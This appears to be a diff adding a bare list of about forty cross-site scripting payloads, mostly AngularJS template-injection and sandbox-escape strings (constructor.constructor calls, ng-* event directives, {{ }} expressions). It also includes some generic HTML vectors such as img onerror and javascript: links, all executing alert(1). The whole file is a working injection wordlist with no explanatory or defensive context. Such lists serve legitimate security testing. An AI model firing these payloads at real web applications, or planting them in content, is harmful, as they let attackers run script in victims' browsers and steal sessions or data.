@@ -1,0 +1,40 @@
+{{constructor.constructor('alert(1)')()}}
+{{"".constructor.constructor("alert(1)")()}}
+{{this.constructor.constructor('alert(1)')()}}
+{{[1].map(()=>alert(1))}}
+<svg onload="constructor.constructor('alert(1)')()">
+<input autofocus ng-focus="alert(1)">
+<div ng-mouseover="alert(1)">X</div>
+<input ng-model="$event=alert(1)" ng-focus="$event()">
+<button ng-click="alert(1)">Click</button>
+<a href="#" ng-click="alert(1)">Click</a>
+<img src=x onerror="alert(1)" />
+<a href="javascript:alert(1)">Click</a>
+<input ng-change="alert(1)">
+<div ng-init="alert(1)"></div>
+<div ng-bind-html="alert(1)"></div>
+{{1+alert(1)}}
+{{1|filter:'alert(1)'}}
+<svg ng-attr-onload="alert(1)"></svg>
+<div ng-class="{alert:alert(1)}"></div>
+<div ng-show="alert(1)"></div>
+<input ng-keyup="alert(1)">
+<button ng-dblclick="alert(1)">Click</button>
+<textarea ng-blur="alert(1)"></textarea>
+<div ng-bind="constructor.constructor('alert(1)')()"></div>
+<span ng-bind-html="constructor.constructor('alert(1)')()"></span>
+<input ng-focus="constructor.constructor('alert(1)')()">
+<div ng-mouseenter="constructor.constructor('alert(1)')()"></div>
+<button ng-click="constructor.constructor('alert(1)')()">Click</button>
+<a ng-href="javascript:alert(1)">Click</a>
+<a ng-click="constructor.constructor('alert(1)')()">Click</a>
+<input ng-change="constructor.constructor('alert(1)')()">
+<input ng-blur="constructor.constructor('alert(1)')()">
+<input ng-keypress="constructor.constructor('alert(1)')()">
+<button ng-mousedown="constructor.constructor('alert(1)')()">Click</button>
+<div ng-if="constructor.constructor('alert(1)')()"></div>
+<input ng-keydown="constructor.constructor('alert(1)')()">
+<div ng-hide="constructor.constructor('alert(1)')()"></div>
+<input ng-paste="constructor.constructor('alert(1)')()">
+<div ng-controller="alert(1)"></div>
+<input ng-submit="alert(1)">
